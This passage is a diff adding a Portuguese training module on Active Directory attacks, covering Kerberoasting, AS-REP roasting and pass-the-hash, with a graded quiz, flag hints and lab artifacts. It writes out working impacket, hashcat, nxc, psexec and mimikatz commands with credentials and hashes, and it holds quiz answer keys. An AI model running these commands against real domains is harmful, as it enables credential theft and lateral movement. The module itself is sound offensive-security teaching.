@@ -1,0 +1,573 @@
+---
+slug: ataques-classicos-ad
+track: trilha-7
+title: "Ataques clássicos"
+prerequisites: [enumeracao-de-dominio]
+lab: null
+tasks:
+  - slug: missao-1-kerberoast
+    title: "Missão 1 — quebrar o ticket Kerberoastável"
+    type: flag
+    prompt: "Rode o cracker contra o hash $krb5tgs$ (Missão 1). O conteúdo cifrado que ele imprime ao achar a senha é a flag. Cole no formato FLAG{...}."
+    hint: "O hash é um TGS-REP (etype 23). Cada formato do Kerberos usa um número de key usage diferente para derivar a chave; o do TGS-REP não é o mesmo do AS-REP. Descubra o número certo e passe-o como segundo argumento do roast.py. A chave de cada tentativa é o NT hash (MD4 da senha em UTF-16LE) — é por isso que uma senha fraca da wordlist quebra."
+    flag:
+      hash: "scrypt$16384$8$1$0073e4211e080c5df0f7870764a59fd02f18da5d95b56a0a0ad223a2af1124a6"
+      salt: "89a55a063a6ad7ce29768b23c85fc834"
+  - slug: missao-2-asrep
+    title: "Missão 2 — quebrar o AS-REP sem senha"
+    type: flag
+    prompt: "Rode o cracker contra o hash $krb5asrep$ (Missão 2), descobrindo a key usage correta do AS-REP. O conteúdo cifrado que ele imprime é a flag. Cole no formato FLAG{...}."
+    hint: "O AS-REP não usa a mesma key usage do TGS-REP da Missão 1. É um número pequeno, diferente de 2. Tente o que corresponde ao modo 18200 do hashcat (AS-REP): a parte cifrada do AS-REP usa a key usage 8. O resto é igual à Missão 1."
+    flag:
+      hash: "scrypt$16384$8$1$9fd8426a3e63a50e6a1078e12234c3ffedcd9e0c9b470fa0802332ff90e71279"
+      salt: "424e631834c8bbe8f84e51f2754967ae"
+  - slug: missao-3-pth
+    title: "Missão 3 — o artefato que vira pass-the-hash"
+    type: flag
+    prompt: "Dos quatro artefatos de credencial do m3-credentials.json, decodifique a nota (base64) do ÚNICO que, sozinho, já autentica por pass-the-hash. Cole o FLAG{...} que aparece."
+    hint: "Pass-the-hash autentica com o NT hash cru, sem a senha e sem desafio nenhum. A resposta NTLMv2 foi calculada com um desafio do servidor (só serve para quebra offline, não para replay); o TGT Kerberos é pass-the-ticket (assunto do 7.4); a senha em claro não é um hash. Só um artefato é reutilizável como está — decodifique a nota dele. As outras três notas começam com 'decoy:' e explicam por que não servem."
+    flag:
+      hash: "scrypt$16384$8$1$0d2626f9f9f83180f962e3c25388d8d4d38a3c1b37ae1c6741647b56e3cb6e52"
+      salt: "f759224be53165aeb74761015c2663a1"
+  - slug: quiz-final
+    title: "Quiz — Ataques clássicos"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que o Kerberoasting permite quebrar a senha de uma conta de serviço offline, sem tocar na conta-alvo nem precisar de privilégio nenhum?"
+        options:
+          - "Porque o KDC envia a senha da conta de serviço em texto claro dentro do TGS-REP"
+          - "Porque parte do ticket de serviço (TGS-REP) é cifrada com uma chave derivada da senha da conta de serviço, e qualquer usuário autenticado pode pedir esse ticket e tentar quebrá-lo no próprio computador, sem mais interação com o domínio"
+          - "Porque é preciso ser Domain Admin para pedir o ticket, e aí a senha já está comprometida"
+          - "Porque o protocolo Kerberos não usa criptografia nenhuma nos tickets"
+        answer: 1
+        explanation: "O KDC entrega o ticket de serviço a qualquer usuário autenticado que peça por um SPN — é o funcionamento normal. O problema é que, no etype 23 (RC4-HMAC), a chave que cifra o ticket é o NT hash da conta de serviço. O atacante leva essa parte cifrada para casa e testa senhas offline, à velocidade da sua própria máquina, sem gerar mais um único pacote para o domínio e sem tocar na conta. O KDC não manda senha em claro (A), não exige privilégio para emitir o ticket (C), e o Kerberos é todo cifrado (D) — é justamente a chave fraca que o derruba."
+      - question: "O que caracteriza uma conta vulnerável a AS-REP roasting, e por que o atacante consegue o material cifrado sem nem saber a senha dela?"
+        options:
+          - "A conta precisa ser membro de Domain Admins"
+          - "A conta tem o bit DONT_REQ_PREAUTH ligado; como a pré-autenticação está dispensada, o KDC responde ao AS-REQ com um AS-REP cujo material é cifrado com a chave da senha do usuário — e esse AS-REP é entregue sem o atacante provar que conhece a senha"
+          - "A conta tem a senha vazia, e o KDC a devolve em claro"
+          - "O atacante precisa interceptar fisicamente o tráfego de rede do usuário"
+        answer: 1
+        explanation: "A pré-autenticação do Kerberos existe exatamente para impedir isto: normalmente você só recebe o AS-REP depois de provar, com um carimbo de tempo cifrado, que conhece a senha. Com DONT_REQ_PREAUTH ligado, essa prova é dispensada — qualquer um pede o AS-REP de uma lista de nomes e recebe material cifrado com a chave do usuário, pronto para quebra offline. Não precisa ser admin (A), a senha não vai em claro (C) e nada disso exige sniffing de rede (D): basta falar com o KDC."
+      - question: "Qual a diferença entre o NT hash de uma conta e uma resposta NTLMv2 capturada dela — e por que isso decide se dá para fazer pass-the-hash?"
+        options:
+          - "São a mesma coisa com nomes diferentes; os dois servem para pass-the-hash"
+          - "O NT hash é um valor fixo da conta e serve diretamente como credencial no NTLM (pass-the-hash); a resposta NTLMv2 é recalculada a cada login a partir de um desafio aleatório do servidor, então só serve para quebra offline, nunca para replay"
+          - "A resposta NTLMv2 pode ser reutilizada em qualquer servidor, mas o NT hash não"
+          - "Nenhum dos dois tem utilidade para um atacante sem a senha em claro"
+        answer: 1
+        explanation: "Esse é o erro clássico de quem começa. O NT hash é derivado só da senha (MD4 dela) e não muda entre logins; o NTLM prova identidade com ele, então tê-lo basta — é o pass-the-hash. Já a resposta NTLMv2 mistura o hash com um desafio aleatório que o servidor sorteia naquele login; replayá-la não funciona porque o próximo desafio é outro. Ela só tem valor levada para quebra offline. Por isso capturar hash (reutilizável) e capturar resposta NTLMv2 (só crackável) levam a caminhos diferentes."
+      - question: "Uma conta de serviço tem um SPN e, portanto, aparece como alvo de Kerberoasting. Por que convertê-la em uma gMSA praticamente anula esse ataque?"
+        options:
+          - "Porque a gMSA deixa de aparecer na enumeração LDAP"
+          - "Porque o Active Directory gera e rotaciona sozinho uma senha de mais de 120 caracteres aleatórios para a gMSA; o ticket continua sendo emitido, mas a senha é longa e aleatória demais para ser quebrada offline em qualquer prazo útil"
+          - "Porque a gMSA desabilita o protocolo Kerberos para aquela conta"
+          - "Porque a gMSA passa a exigir pré-autenticação, o que bloqueia o Kerberoasting"
+        answer: 1
+        explanation: "O Kerberoasting não é impedido — o KDC ainda entrega o ticket. O que a gMSA muda é a única coisa que importa: a senha. Com 120+ caracteres aleatórios rotacionados pelo próprio AD, não há wordlist nem força bruta que a alcance no tempo de vida da chave. A conta continua visível na enumeração (A é falso), o Kerberos segue funcionando (C), e pré-autenticação é a defesa do AS-REP roasting, não do Kerberoasting (D)."
+      - question: "Você comprometeu uma estação e extraiu da memória o NT hash da conta svc_backup (mas não a senha em claro). Descobriu que svc_backup é administradora local de três servidores. Qual é o caminho mais direto para usar essa conta nesses servidores?"
+        options:
+          - "Fazer Kerberoasting da svc_backup"
+          - "Fazer AS-REP roasting da svc_backup"
+          - "Pass-the-hash: autenticar nos três servidores usando o NT hash extraído, sem precisar quebrar nada"
+          - "Quebrar o NT hash offline primeiro, porque sem a senha em claro é impossível autenticar"
+        answer: 2
+        explanation: "No NTLM, o hash já é a credencial: com o NT hash de svc_backup você autentica nos servidores onde ela é admin local e executa comandos, sem nunca descobrir a senha. Quebrar o hash (D) seria trabalho extra e desnecessário — e pode nem ser viável. Kerberoasting (A) e AS-REP roasting (B) resolvem problemas diferentes (obter uma senha a partir de um SPN, ou de uma conta sem pré-auth); aqui você já tem o hash e um destino, então o movimento é pass-the-hash."
+glossary:
+  - term: KDC
+    definition: "Key Distribution Center: o serviço central do Kerberos que autentica usuários e emite os tickets. No Active Directory, todo domain controller é um KDC."
+  - term: TGT
+    definition: "Ticket-granting ticket: o 'crachá mestre' que o KDC entrega ao usuário na autenticação inicial (no AS-REP). Com o TGT, o usuário pede tickets de serviço sem digitar a senha de novo."
+  - term: TGS
+    definition: "Ticket-granting service: a parte do KDC que, mediante um TGT válido, emite o ticket de serviço (service ticket) para um SPN. O material cifrado desse ticket de serviço é o que o Kerberoasting quebra."
+  - term: RC4-HMAC (etype 23)
+    definition: "O tipo de criptografia legado do Kerberos (encryption type 23) cuja chave é o próprio NT hash da conta. É o que torna Kerberoasting e AS-REP roasting quebráveis offline; forçar AES (etypes 17/18) tira esse atalho."
+  - term: pass-the-hash
+    definition: "Técnica que usa o NT hash de uma conta diretamente como credencial no protocolo NTLM, sem nunca conhecer a senha em claro — porque o NTLM prova a identidade com o hash, não com a senha."
+  - term: gMSA
+    definition: "Group Managed Service Account: conta de serviço cuja senha de 120+ caracteres o Active Directory gera e rotaciona sozinho, tornando o Kerberoasting inútil contra ela."
+  - term: Mimikatz
+    definition: "Ferramenta aberta, criada por Benjamin Delpy, que extrai senhas, hashes e tickets Kerberos da memória do Windows (do processo LSASS) e executa pass-the-hash e pass-the-ticket."
+---
+
+import kerberosTrocas from "./img/kerberos-tres-trocas.svg";
+import qualAtaqueQuando from "./img/qual-ataque-quando.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No módulo anterior você virou um usuário comum em um **mapa**: a lista de usuários, os grupos, quem administra o quê, e os atributos que denunciam contas frágeis (o `svc_mssql` com SPN, o `svc_legacy` sem pré-autenticação). Agora chega a pergunta óbvia: *e aí, o que eu faço com isso?* Este módulo é a resposta. Ele pega três achados da enumeração e os transforma em **credenciais** — a matéria-prima para tomar o domínio.
+
+Os três ataques clássicos têm um parentesco que surpreende: dois deles (<GlossaryTerm term="Kerberoasting">Kerberoasting</GlossaryTerm> e <GlossaryTerm term="AS-REP roasting">AS-REP roasting</GlossaryTerm>) não "invadem" nada no servidor — eles pedem ao <GlossaryTerm term="Kerberos">Kerberos</GlossaryTerm> um material que o próprio protocolo entrega de bom grado, e quebram a senha **offline**, na máquina do atacante, sem gerar mais ruído. O terceiro (<GlossaryTerm term="pass-the-hash">pass-the-hash</GlossaryTerm>) é ainda mais direto: ele **nem quebra** a senha — usa o hash como se fosse a senha. Entender por que isso funciona é entender uma verdade incômoda do Windows: em muitos pontos, o que prova quem você é não é a sua senha, é um derivado dela que o atacante consegue roubar ou pedir.
+
+Praticamente toda intrusão séria em rede Windows — de operadores de ransomware a red teams — passa por um destes três. Eles são o elo entre "tenho uma conta qualquer" (7.2) e "tenho a conta que importa" (7.4). Saber executá-los é metade; a outra metade, que fecha a visão do profissional, é saber por que cada um existe e como o defensor os mata na raiz.
+
+**Ao final, você vai saber:**
+
+- explicar as três trocas do Kerberos e apontar, nelas, onde o Kerberoasting e o AS-REP roasting extraem material quebrável;
+- executar os três ataques com as ferramentas reais (`impacket`, `hashcat`/John, `nxc`/NetExec, <GlossaryTerm term="Mimikatz">Mimikatz</GlossaryTerm>) e ler suas saídas;
+- entender por que o <GlossaryTerm term="RC4-HMAC (etype 23)">RC4-HMAC (etype 23)</GlossaryTerm> torna os tickets quebráveis — a ponto de você mesmo quebrar um, à mão, em Python;
+- decidir **quando cada ataque se aplica** a partir de um achado da enumeração;
+- defender o domínio: <GlossaryTerm term="gMSA">gMSA</GlossaryTerm>, pré-autenticação, AES, Credential Guard e a detecção pelos eventos certos.
+
+**Pré-requisitos:** 7.2 — Enumeração de domínio (você vai usar daqui: os achados `servicePrincipalName`, o bit `DONT_REQ_PREAUTH` do `userAccountControl`, e o raciocínio de "o que eu controlo × o que tem poder"). Da Trilha 3, você reusa a ideia de hash e de quebra offline com wordlist; da Trilha 6, a noção de pegar uma credencial e reusá-la.
+
+**Tempo estimado:** 3 a 4 horas, incluindo as três missões de quebra e análise.
+
+<Callout variant="ethics">
+Pedir tickets, quebrar hashes e reutilizar credenciais de contas de uma organização só é legítimo no laboratório ou em um engajamento com autorização por escrito que inclua o domínio no escopo (você viu o enquadramento na Trilha 1; no Brasil, acesso não autorizado a sistema informático é crime, Lei 12.737/2012). Este módulo **não tem lab próprio**: a Trilha 7 é teoria + walkthrough guiado, e as missões são de **quebra e análise de artefatos fictícios que você mesmo gera no seu WSL**. Nenhum domínio real é tocado.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+Os três ataques deste módulo atacam o mesmo ponto fraco por ângulos diferentes: **a senha de uma conta vira uma chave criptográfica, e essa chave acaba exposta** — ora dentro de um ticket que qualquer um pode pedir, ora como um hash que o protocolo aceita no lugar da senha. Para ver isso com clareza, precisamos abrir o Kerberos.
+
+### 2.1 Kerberos em três trocas
+
+O <GlossaryTerm term="Kerberos">Kerberos</GlossaryTerm> é o protocolo de autenticação padrão do Active Directory. A ideia central é não mandar a senha pela rede: em vez disso, um servidor central confiável — o <GlossaryTerm term="KDC">KDC</GlossaryTerm> (Key Distribution Center; no AD, é o próprio domain controller, o controlador de domínio) — emite **tickets**, pedaços de dados cifrados que provam identidade. São três trocas:
+
+1. **Autenticação (AS-REQ / AS-REP).** Você prova ao KDC que conhece a sua senha e recebe de volta um <GlossaryTerm term="TGT">TGT</GlossaryTerm> (ticket-granting ticket), o "crachá mestre". Normalmente, você prova a senha enviando um carimbo de tempo cifrado com a chave dela — é a **pré-autenticação**. Guarde isto: é justamente a pré-autenticação que o AS-REP roasting explora quando está desligada.
+2. **Ticket de serviço (TGS-REQ / TGS-REP).** De posse do TGT, você pede ao <GlossaryTerm term="TGS">TGS</GlossaryTerm> (ticket-granting service, outra função do KDC) um **service ticket** para um serviço específico, identificado pelo seu <GlossaryTerm term="servicePrincipalName (SPN)">servicePrincipalName</GlossaryTerm> (SPN). O KDC entrega. Guarde isto também: esse service ticket é o alvo do Kerberoasting.
+3. **Uso (AP-REQ).** Você apresenta o service ticket diretamente ao serviço de aplicação (um SQL Server, um IIS), que confia nele porque foi cifrado com uma chave que só ele e o KDC conhecem — a chave da **conta sob a qual o serviço roda**.
+
+<Figure
+  src={kerberosTrocas}
+  alt="Diagrama em três faixas. VOCÊ, à esquerda, é a conta que o atacante controla. Troca 1: AS-REQ para o AS e AS-REP de volta com o TGT; um aviso marca o AS-REP roasting (conta sem pré-auth devolve AS-REP cifrado com a chave do usuário, quebrável offline). Troca 2: TGS-REQ com o TGT e o SPN, TGS-REP de volta com o service ticket; um aviso marca o Kerberoasting (o service ticket é cifrado com a chave da conta de serviço, quebrável offline). Troca 3: AP-REQ apresentando o service ticket ao serviço. Uma faixa embaixo diz que pass-the-hash não usa Kerberos: é NTLM, onde o NT hash prova a identidade sem senha e sem ticket."
+  caption="As três trocas do Kerberos. Kerberoasting morde o TGS-REP (chave = senha da conta de serviço); AS-REP roasting morde o AS-REP (chave = senha do usuário sem pré-auth). Pass-the-hash fica fora: é do NTLM."
+/>
+
+### 2.2 Por que o ticket é quebrável: o etype 23
+
+A peça central dos dois ataques de "roasting" é **como** o KDC cifra esses tickets. O Kerberos suporta vários tipos de criptografia (chamados *encryption types*, ou *etypes*). O mais perigoso é o legado <GlossaryTerm term="RC4-HMAC (etype 23)">RC4-HMAC, o etype 23</GlossaryTerm>: nele, a chave de cifra é literalmente o **NT hash** da conta — isto é, `MD4` da senha em UTF-16LE. (Esse NT hash é o mesmo NTLM hash que você vai reencontrar no pass-the-hash.)
+
+A consequência é devastadora para a conta de senha fraca. Quando o KDC emite o service ticket, a parte sensível vai cifrada com a chave da conta de serviço. O atacante pega essa parte cifrada e, no seu próprio computador, testa senhas: para cada candidata, calcula `MD4(candidata)`, tenta decifrar e confere um checksum embutido. Se bater, achou a senha — **sem nunca mais falar com o domínio**. É exatamente o que a MITRE descreve na técnica T1558.003: *"the Kerberos 5 TGS-REP etype 23 hash of the service account ... is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials"*.
+
+Em etypes modernos (AES, etypes 17 e 18), a chave passa por uma derivação lenta (uma função baseada em PBKDF2) que encarece absurdamente a quebra. Por isso o atacante, quando pode, **força o RC4**: ele pede o ticket anunciando que só entende etype 23, e muitos KDCs ainda o atendem por compatibilidade.
+
+### 2.3 Kerberoasting × AS-REP roasting: o mesmo truque, trocas diferentes
+
+- **Kerberoasting** (troca 2). Você pede um service ticket para o SPN de uma **conta de usuário** (os achados do 7.2). Como o serviço roda sob essa conta, o ticket é cifrado com a senha dela — muitas vezes uma senha humana, escolhida uma vez e nunca trocada. Qualquer usuário autenticado pode pedir esse ticket; a MITRE o cataloga como [T1558.003](https://attack.mitre.org/techniques/T1558/003/).
+- **AS-REP roasting** (troca 1). Você mira contas com a pré-autenticação **desligada** (o bit `DONT_REQ_PREAUTH` no <GlossaryTerm term="userAccountControl">userAccountControl</GlossaryTerm>). Sem a pré-autenticação, o KDC responde ao primeiro pedido (AS-REQ) com um AS-REP cujo material é cifrado com a chave do usuário — e ele faz isso **sem você provar nada**. Ou seja: você obtém material quebrável de uma conta **sem nem ter uma credencial inicial dela**. É a [T1558.004](https://attack.mitre.org/techniques/T1558/004/).
+
+A diferença prática é *de que ponta você puxa o material*: do ticket de serviço (Kerberoasting, exige uma credencial qualquer no domínio para pedir) ou do próprio AS-REP (AS-REP roasting, não exige credencial alguma, só uma lista de nomes). O que vem depois — quebrar `MD4`/RC4 offline — é idêntico.
+
+### 2.4 Pass-the-hash: quando a senha é irrelevante
+
+O terceiro ataque muda de protocolo. O NTLM, o esquema de autenticação mais antigo do Windows (que convive com o Kerberos), funciona assim: o cliente prova que conhece a senha provando que possui o **NT hash** dela, num desafio-resposta. O ponto cego é que o protocolo **nunca re-deriva a senha a partir do hash** — ele só precisa do hash. Logo, se o atacante rouba o NT hash (da memória do LSASS, o processo do Windows que guarda os segredos de autenticação; do arquivo SAM; de um backup), ele pode se autenticar **como se tivesse a senha**, sem nunca descobri-la. Isso é o <GlossaryTerm term="pass-the-hash">pass-the-hash</GlossaryTerm>, a técnica [T1550.002](https://attack.mitre.org/techniques/T1550/002/) do ATT&CK.
+
+Aqui mora o erro clássico de iniciante, que a Missão 3 vai cravar: **NT hash não é a mesma coisa que uma resposta NTLMv2 capturada na rede**. O NT hash é fixo e reutilizável — serve para pass-the-hash. A resposta NTLMv2 foi calculada com um desafio aleatório daquele login específico; replayá-la não funciona (o próximo desafio é outro), e ela só tem valor se levada para **quebra offline**. Confundir os dois leva o atacante a tentar o impossível, ou a desperdiçar um material valioso.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos aos comandos reais, do ponto de vista de um Kali com um par de credenciais do domínio `corp.local` (usuário `j.silva`), contra o controlador `dc01.corp.local` em `192.168.56.10`. Você não tem um domínio para rodar isto agora — a Trilha 7 é guiada, e a seção 5 treina a **quebra e a análise** do material. Aqui a sessão é demonstrada para você reconhecer cada passo. (As ferramentas são as do Kali; os IPs e nomes são genéricos.)
+
+### 3.1 Kerberoasting com `impacket` + `hashcat`
+
+O `impacket-GetUserSPNs` autentica, procura as contas de usuário com SPN e, com `-request`, já pede o service ticket de cada uma, cuspindo o hash no formato do hashcat:
+
+```console
+$ impacket-GetUserSPNs corp.local/j.silva:'Ver@o2026!' -dc-ip 192.168.56.10 -request
+ServicePrincipalName           Name       MemberOf              PasswordLastSet
+-----------------------------  ---------  --------------------  -------------------
+MSSQLSvc/dc01.corp.local:1433  svc_mssql  CN=Services,...        2024-03-11 09:12:03
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$a1b2...<parte cifrada>...
+```
+
+O `$krb5tgs$23$` denuncia o etype 23. Esse hash vai para a quebra offline, com o modo **13100** do hashcat (Kerberos 5 TGS-REP, etype 23):
+
+```console
+$ hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+...
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$...:Verao2024!
+Status...........: Cracked
+```
+
+Achou `Verao2024!` — uma senha humana, fraca, que nunca expirou. (No John the Ripper, o formato é `--format=krb5tgs`.)
+
+### 3.2 AS-REP roasting com `impacket` + `hashcat`
+
+O `impacket-GetNPUsers` ("NP" de *no preauth*) procura as contas sem pré-autenticação e pede o AS-REP de cada uma. Com uma credencial do domínio, ele descobre sozinho quais contas têm o bit ligado:
+
+```console
+$ impacket-GetNPUsers corp.local/j.silva:'Ver@o2026!' -dc-ip 192.168.56.10 -request
+Name        MemberOf  PasswordLastSet      UAC      Preauth
+----------  --------  -------------------  -------  -------
+svc_legacy            2023-02-01 14:03:11  0x410200 Disabled
+
+$krb5asrep$23$svc_legacy@CORP.LOCAL:b3c4...<parte cifrada>...
+```
+
+Repare no `$krb5asrep$23$`. A quebra é o modo **18200** do hashcat (AS-REP, etype 23):
+
+```console
+$ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+$krb5asrep$23$svc_legacy@CORP.LOCAL:...:Inverno23
+Status...........: Cracked
+```
+
+Sem uma credencial inicial, daria para rodar o mesmo `GetNPUsers` com `-no-pass` e um arquivo de nomes (`-usersfile users.txt`): ele testa cada nome e devolve o AS-REP dos que não exigem pré-auth. Enumeração e ataque no mesmo movimento.
+
+### 3.3 Pass-the-hash com `nxc` e `impacket`
+
+Agora o outro protocolo. Suponha que você extraiu da memória, com o <GlossaryTerm term="Mimikatz">Mimikatz</GlossaryTerm>, o NT hash de `svc_mssql`. Você **não precisa quebrá-lo**: passa o hash direto. O `nxc` (NetExec) testa o hash contra uma máquina via SMB — a flag `-H` recebe o NT hash no lugar de `-p`:
+
+```console
+$ nxc smb 192.168.56.20 -u svc_mssql -H 72f0eefcc213ea8f350773b831cf2c9c
+SMB  192.168.56.20  445  SRV02  [+] corp.local\svc_mssql:72f0ee...(Pwn3d!)
+```
+
+O `(Pwn3d!)` indica que a conta é administradora local ali — o que abre a execução de comandos. Para abrir uma shell, o `impacket-psexec` aceita o hash com `-hashes LMHASH:NTHASH` (o LM pode ir vazio):
+
+```console
+$ impacket-psexec -hashes :72f0eefcc213ea8f350773b831cf2c9c corp.local/svc_mssql@192.168.56.20
+[*] Found writable share ADMIN$
+C:\Windows\system32> whoami
+corp\svc_mssql
+```
+
+No próprio Windows, o `mimikatz` injeta o hash numa nova sessão com `sekurlsa::pth /user:svc_mssql /domain:corp.local /ntlm:72f0ee...`, e os processos filhos autenticam na rede como aquela conta. Em nenhum momento a senha em claro apareceu.
+
+<Figure
+  src={qualAtaqueQuando}
+  alt="Árvore de decisão. Da caixa 'achado da enumeração (7.2)' saem três ramos. Ramo 1, pergunta 'tenho só o NT hash da conta?' leva a pass-the-hash, que autentica com o hash sem quebrar nada. Ramo 2, 'conta de usuário com SPN?' leva a Kerberoasting, que pede o TGS-REP e quebra offline a senha da conta de serviço. Ramo 3, 'conta com DONT_REQ_PREAUTH?' leva a AS-REP roasting, que pede o AS-REP e quebra offline a senha do usuário. Uma faixa resume: roasting recupera a senha quebrando offline; pass-the-hash dispensa a senha porque o hash já é a credencial."
+  caption="Qual ataque quando: cada achado da enumeração aponta para um dos três. É o mapa de decisão que a Missão 3 e o quiz cobram."
+/>
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### A origem do Kerberoasting — Tim Medin, DerbyCon 2014
+
+O Kerberoasting não foi descoberto por um grupo criminoso: foi apresentado como pesquisa de segurança. Em **2014**, na conferência DerbyCon 4.0, o pesquisador **Tim Medin** (então na SANS) apresentou a palestra *"Attacking Microsoft Kerberos: Kicking the Guard Dog of Hades"*, em que descreveu a técnica e liberou a primeira ferramenta para executá-la, o script `tgsrepcrack.py`. Foi ele quem cunhou o entendimento que usamos até hoje: qualquer usuário do domínio pode pedir o ticket de uma conta de serviço e quebrar a senha offline, porque a chave do ticket é derivada dessa senha.
+
+- **Impacto:** a técnica revelou que uma classe inteira de contas — as contas de serviço com SPN, comuns em qualquer rede com SQL Server, IIS ou aplicações corporativas — estava exposta por desenho, sem que ninguém precisasse de privilégio para atacá-la. Virou item padrão de todo teste de AD e de todo manual de ransomware. A quebra, antes conceitual, hoje roda em GPU a bilhões de tentativas por segundo com o modo 13100 do hashcat.
+- **Lição:** a defesa não é "impedir o pedido do ticket" (isso quebraria o Kerberos), e sim **tornar a senha inquebrável** (gMSA, senhas longas) e **detectar** o pedido suspeito (o evento 4769 com etype RC4). É a defesa que a seção 8 detalha.
+- **Fonte:** [Sean Metcalf — "Cracking Kerberos TGS Tickets Using Kerberoast" (adsecurity.org)](https://adsecurity.org/?p=2293), que documenta a técnica e credita a apresentação de Tim Medin na DerbyCon 2014; e [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/).
+
+### Pass-the-hash em escala global — NotPetya (2017)
+
+Em **27 de junho de 2017**, o malware **NotPetya** paralisou empresas no mundo todo. Embora seja lembrado pelo exploit de SMB **EternalBlue**, parte decisiva da sua propagação foi **roubo de credenciais e pass-the-hash**. A análise da Microsoft, publicada no mesmo dia, descreve que o malware *"drops a credential dumping tool ... that shares code similarities with Mimikatz"* e que, com as credenciais roubadas, *"it then tries to execute remotely the malware using either PSEXEC or WMIC tools"* — ou seja, ele dumpava hashes/credenciais da memória e os reutilizava para se mover lateralmente, exatamente o padrão deste módulo.
+
+- **Impacto:** o ataque atingiu multinacionais como Maersk e Merck e causou prejuízo estimado em **cerca de US$ 10 bilhões** em escala global (reportagem de Andy Greenberg, *WIRED*). Em fevereiro de 2018, a Casa Branca atribuiu o ataque ao exército russo e o chamou do *"most destructive and costly cyber attack in history"*.
+- **Lição:** pass-the-hash não é um truque de laboratório — é o mecanismo que permitiu a um worm pular de máquina em máquina dentro de redes inteiras em minutos. Reutilização de credencial e contas de administrador local com a mesma senha em todo o parque são o que tornam isso possível; a defesa (LAPS, segmentação, Credential Guard) é a mesma que trava o atacante manual.
+- **Fonte:** [Microsoft — "New ransomware, old techniques: Petya adds worm capabilities" (27 jun. 2017)](https://www.microsoft.com/en-us/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/); [MITRE ATT&CK T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/).
+
+## 5. Mãos à obra — quebrar os tickets e achar o caminho
+
+Este módulo **não tem lab próprio** (a decisão da plataforma é manter a Trilha 7 enxuta, sem subir um domínio inteiro nos seus 16 GB). Mas o coração destes ataques **não** é apertar um botão de ferramenta: é entender que a chave do ticket é o NT hash e quebrá-la offline, e saber qual credencial vira qual ataque. É isso que você vai fazer — de verdade, quebrando criptografia RC4-HMAC do Kerberos com um cracker em Python puro que você mesmo roda, contra artefatos sanitizados (domínio `corp.local`, controlador `dc01`, conta que você controla `j.silva`).
+
+**Objetivo:** ao terminar, você terá (1) quebrado um ticket **Kerberoastável** e lido a flag que estava cifrada nele; (2) quebrado um **AS-REP**, descobrindo a key usage certa; e (3) identificado, entre quatro artefatos de credencial, o único que serve para **pass-the-hash**. Três flags, uma por missão.
+
+<Callout variant="info" title="Por que um cracker em Python, e não o hashcat?">
+Contra um domínio real, você usaria `impacket` + `hashcat` (seção 3). Aqui, para rodar 100% offline no seu WSL e **ver a matemática por dentro**, os artefatos foram forjados para o exercício: a parte cifrada do ticket guarda uma flag em vez da estrutura binária real do Kerberos, e um cracker curto em Python reproduz fielmente a decifragem RC4-HMAC (etype 23) — o mesmo `MD4` + RC4 + HMAC-MD5 que o hashcat faz em GPU. A lição criptográfica é idêntica; só a escala muda.
+</Callout>
+
+### 5.1 Preparar o terreno (passo a passo)
+
+Abra o terminal do Ubuntu (WSL) e cole o bloco inteiro de uma vez. Ele cria, em `/tmp/ad-attacks`, os artefatos das três missões:
+
+```bash
+ROOT=/tmp/ad-attacks
+rm -rf "$ROOT"; mkdir -p "$ROOT"; cd "$ROOT"
+
+# Missao 1: hash Kerberoastavel (TGS-REP, etype 23), formato do hashcat -m 13100
+cat > m1-kerberoast.txt <<'EOF'
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$d25e8da0c7fe53cb4a9b07a695bd2c54$74092b8c31acd7a4215308c73b59c35db1ce103950b9952e063d7559fc4d6f927821768c7d09c30b0a9ee9ac78cd83d98f
+EOF
+
+# Missao 2: hash AS-REP (etype 23), formato do hashcat -m 18200
+cat > m2-asrep.txt <<'EOF'
+$krb5asrep$23$svc_legacy@CORP.LOCAL:26e4473c0599fff7fe666504db75ab7d$7bc7d05b2979798f9de73666874523f883bba70714354370d235cd8f12826ce6206255129dd4ee450b6ec1fd2575a6fdd4
+EOF
+
+# Wordlist curta (as senhas reais estao escondidas entre iscas)
+printf '%s\n' Password1 Welcome1 Autumn2024 'Summer2024!' admin Qwerty123 \
+  Winter2023 'P@ssw0rd' 'Spring2024!' Company1 letmein Changeme123 \
+  Server2019 Monday123 Football7 > wordlist.txt
+
+# Missao 3: quatro artefatos de credencial da mesma conta (notas em base64)
+cat > m3-credentials.json <<'EOF'
+{
+  "target": "svc_mssql",
+  "pergunta": "qual destes, sozinho, ja autentica por pass-the-hash?",
+  "artifacts": [
+    { "kind": "nt_hash",         "value": "72f0eefcc213ea8f350773b831cf2c9c",
+      "note": "RkxBR3twYXNzLXRoZS1oYXNoLXRoZS1udC1oYXNoLWlzLXRoZS1jcmVkZW50aWFsfQ==" },
+    { "kind": "ntlmv2_response", "value": "svc_mssql::CORP:1122334455667788:A1B2...<resposta ao desafio>",
+      "note": "ZGVjb3k6IGFuIE5UTE12MiByZXNwb25zZSBpcyBzYWx0ZWQgd2l0aCB0aGUgc2VydmVyIGNoYWxsZW5nZTsgaXQgb25seSBsZXRzIHlvdSBjcmFjayBvZmZsaW5lLCB5b3UgY2Fubm90IHJlcGxheSBpdCBhcyBhIGNyZWRlbnRpYWw=" },
+    { "kind": "kerberos_tgt",    "value": "doIFujCCBb...<TGT em base64>",
+      "note": "ZGVjb3k6IGEgS2VyYmVyb3MgVEdUIGlzIHJlcGxheWVkIHdpdGggcGFzcy10aGUtdGlja2V0LCBjb3ZlcmVkIGluIDcuNCwgbm90IHBhc3MtdGhlLWhhc2g=" },
+    { "kind": "cleartext",       "value": "Summer2024!",
